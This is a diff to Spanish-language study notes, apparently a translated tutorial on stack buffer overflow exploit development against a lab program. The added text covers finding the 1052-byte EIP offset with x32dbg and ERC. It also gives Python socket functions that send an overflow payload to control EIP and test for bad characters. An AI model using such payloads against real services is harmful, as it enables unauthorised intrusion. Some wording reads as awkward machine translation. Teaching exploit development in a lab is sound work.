@@ -646,7 +646,54 @@ Una vez que nuestra `eip_offset()` función esté lista, podemos reiniciar nues
 
 ![](../../Images/Pasted%20image%2020240925170022.png)
 
-Ahora podemos usar `ERC --pattern o 1jB0` para calcular el desplazamiento exacto, que se encuentra en `1052`bytes:
+Ahora podemos usar `ERC --pattern o 1jB0` para calcular el desplazamiento exacto, que se encuentra en `1052` bytes:
+
+![](../../Images/Pasted%20image%2020240925170034.png)
+
+Ahora, para asegurarnos de que podemos controlar el valor exacto en `EIP`, usaremos la misma `eip_control()`función de nuestro exploit anterior (mientras cambiamos `offset`), pero usando `socket`para enviar nuestra carga útil en lugar de escribirla en un archivo:
+
+```python
+def eip_control():
+    offset = 1052
+    buffer = b"A"*offset
+    eip = b"B"*4
+    payload = buffer + eip
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+eip_control()
+```
+
+Reiniciaremos nuevamente nuestro programa y ejecutaremos nuestro exploit, y podremos confirmar que tenemos el control `EIP` ya que sobrescribimos `EIP`con 4 `B`:
+### Identificando malos personajes
+
+Nuestro siguiente paso es identificar si debemos evitar el uso de caracteres incorrectos en nuestra entrada. Podemos comenzar ejecutando `ERC --bytearray` in `x32dbg` para crear nuestro `ByteArray_1.bin` archivo. Luego podemos copiar las mismas `bad_chars()` funciones de nuestro exploit anterior y, una vez más, cambiar de escribir la carga útil en un archivo a enviarla al puerto:
+
+```python
+def bad_chars():
+    all_chars = bytes([
+        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        ...SNIP...
+        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
+    ])
+
+    offset = 1052
+    buffer = b"A"*offset
+    eip = b"B"*4
+    payload = buffer + eip + all_chars
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+bad_chars()
+```
+
+Una vez que reiniciamos nuestro programa `x32dbg` y ejecutamos nuestro exploit, podemos usar `ERC --compare` para comparar los bytes en la `ESP` dirección con el `ByteArray_1.bin` archivo:
 
 
 
